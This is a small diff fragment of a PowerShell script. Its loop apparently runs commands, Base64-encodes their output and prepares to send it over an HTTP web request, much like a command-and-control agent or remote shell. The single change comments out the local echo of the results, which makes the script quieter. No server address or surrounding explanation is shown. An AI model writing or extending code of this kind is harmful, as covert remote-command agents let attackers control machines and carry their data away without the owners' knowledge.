@@ -135,7 +135,7 @@ while ($true)
 			#$output = $Error[0] | Out-String;
 		}
 	}
-    Echo $output
+    #Echo $output
 	$bytes = [System.Text.Encoding]::UTF8.GetBytes($output)
 	$redata = [System.Convert]::ToBase64String($bytes)
     $h3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
